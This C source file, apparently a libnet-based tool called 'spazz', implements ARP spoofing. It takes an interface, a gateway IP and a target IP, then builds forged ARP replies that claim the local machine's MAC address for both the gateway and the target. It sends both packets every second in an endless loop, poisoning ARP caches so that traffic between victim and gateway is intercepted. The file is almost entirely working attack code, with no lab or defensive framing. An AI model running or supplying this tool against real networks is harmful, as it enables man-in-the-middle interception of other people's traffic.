#if (HAVE_CONFIG_H)
#if ((_WIN32) && !(__CYGWIN__)) 
#include "../include/win32/config.h"
#else
#include "../include/config.h"
#endif
#endif
#include "libnet.h"
#include "util.h"

char* device = NULL;
int build_broadcast_arp(
    libnet_t * arp_handle,
    uint8_t* target_ip,       /* IP Address */
    uint8_t* is_at,           /* HW Address */
    uint8_t* tell_hw,         /* HW Address */
    uint8_t* tell_ip          /* IP Address */
){
    libnet_ptag_t t;
    uint8_t *target_hw;
    uint8_t *packet;
    uint32_t packet_s;
    u_char broadcast_hw[6] = { 0xff,0xff,0xff,0xff,0xff,0xff };

    if( tell_hw == NULL ){
        target_hw = (uint8_t *)broadcast_hw;
    }else{
        target_hw = tell_hw;
    }

    t = libnet_build_arp(
           ARPHRD_ETHER,                           /* hardware addr */
            ETHERTYPE_IP,                           /* protocol addr */
            6,                                      /* hardware addr size */
            4,                                      /* protocol addr size */
            ARPOP_REPLY,                            /* operation type */
            is_at,                               /* sender hardware addr */
            target_ip,                         /* sender protocol addr */
            target_hw,                          /* Target hardware addr */
            tell_ip,                         /* target protocol addr */
            NULL,                                   /* payload */
            0,                                      /* payload size */
            arp_handle,                                      /* libnet context */
            0);                                     /* libnet id */

    if (t == -1)
    {
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(arp_handle));
        goto bad;
    }
    t = libnet_autobuild_ethernet(
        target_hw,                                // ethernet destination */
        ETHERTYPE_ARP,                           // protocol type */
        arp_handle);                                    //  libnet handle */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n",
        libnet_geterror(arp_handle));
        goto bad;
    }
    if (libnet_adv_cull_packet(arp_handle, &packet, &packet_s) == -1)
    {
        fprintf(stderr, "%s", libnet_geterror(arp_handle));
    }
    else
    {
        fprintf(stderr, "packet size: %d\n", packet_s);
        libnet_adv_free_packet(arp_handle, packet);
    }
        
    
    /*
    c = libnet_write(arp_handle);

    if (c == -1)
    {
        fprintf(stderr, "Write error: %s\n", libnet_geterror(arp_handle));
        goto bad;
    }
    else
    {
        fprintf(stderr, "Wrote %d byte ARP packet from context \"%s\"; "
                "check the wire.\n", c, libnet_cq_getlabel(arp_handle));
    }
    */
    return 0;
bad:
    return -1;
}

void usage(){
    printf("Usage: ./spazz -i <device> -g <gateway ip> -t <target_ip>\n");

}

int main(int argc,char** argv){
    char errbuf[LIBNET_ERRBUF_SIZE];
    char c;
    struct libnet_ether_addr *mac_address;
    char* target_ip;
    uint32_t  target_ip_nbo;
    char* gateway_ip;
    uint32_t  gateway_ip_nbo;
    int ret;
    int broadcast_arp_built = 0;
    libnet_t* arp_handle[2];

    if( argc < 4 ){
        usage();
        return 0;
    }    

    while((c=getopt(argc,argv,"i:t:g:")) != -1){
        switch(c){
            case 'i':
                device = optarg;
                break;
            case 't':
                target_ip = optarg;
                break;
            case 'g':
                gateway_ip = optarg;
                break;
            default:
                fprintf(stderr,"Unrecognized option encountered\n");
                return -2;
        }
    }
    arp_handle[0] = libnet_init(
            LIBNET_LINK_ADV,                        /* injection type */
            device,                                 /* network interface */
            errbuf);                                /* errbuf */
    if( ! arp_handle[0] ){
        fprintf(stderr,"Invalid libnet handle[0]\n");
        return -2;
    }
    arp_handle[1] = libnet_init(
            LIBNET_LINK_ADV,                        /* injection type */
            device,                                 /* network interface */
            errbuf);                                /* errbuf */
    if( ! arp_handle[1] ){
        fprintf(stderr,"Invalid libnet handle[1]\n");
        return -3;
    }

    mac_address = libnet_get_hwaddr(arp_handle[0]);
    target_ip_nbo = libnet_name2addr4(arp_handle[0],target_ip,LIBNET_DONT_RESOLVE);
    gateway_ip_nbo = libnet_name2addr4(arp_handle[0],gateway_ip,LIBNET_DONT_RESOLVE);
    
    
    while(1){
        // Send one arp packet to the gateway
        if( !broadcast_arp_built ){
        ret = build_broadcast_arp(
            arp_handle[0],
            (uint8_t*)&target_ip_nbo,
            (uint8_t*)&mac_address->ether_addr_octet,
            NULL,
            (uint8_t*)&gateway_ip_nbo
        );
        if( ret != 0 ){
            fprintf(stderr,"Unable to send arp packet\n");
            goto bad;
        }

        // Send one arp packet to the target node
        ret = build_broadcast_arp(
            arp_handle[1],
            (uint8_t*)&gateway_ip_nbo,
            (uint8_t*)&mac_address->ether_addr_octet,
            NULL,
            (uint8_t*)&target_ip_nbo
        );
        if( ret != 0 ){
            fprintf(stderr,"Unable to send arp packet\n");
            goto bad;
        }
        broadcast_arp_built = 1;
        }
        c = libnet_write(arp_handle[0]);

        if (c == -1){
            fprintf(stderr, "Write error: %s\n", libnet_geterror(arp_handle[0]));
            goto bad;
        }else{
            fprintf(stderr, "Wrote %d byte ARP packet from context \"%s\"; "
                "check the wire.\n", c, libnet_cq_getlabel(arp_handle[0]));
        }
        c = libnet_write(arp_handle[1]);
        if (c == -1){
            fprintf(stderr, "Write error: %s\n", libnet_geterror(arp_handle[1]));
            goto bad;
        }else{
            fprintf(stderr, "Wrote %d byte ARP packet from context \"%s\"; "
                "check the wire.\n", c, libnet_cq_getlabel(arp_handle[1]));
        }
        sleep(1);
    }
    libnet_destroy(arp_handle[0]);
    libnet_destroy(arp_handle[1]);
    return EXIT_SUCCESS;
bad:
    libnet_destroy(arp_handle[0]);
    libnet_destroy(arp_handle[1]);
    return EXIT_FAILURE;
}

/* EOF */
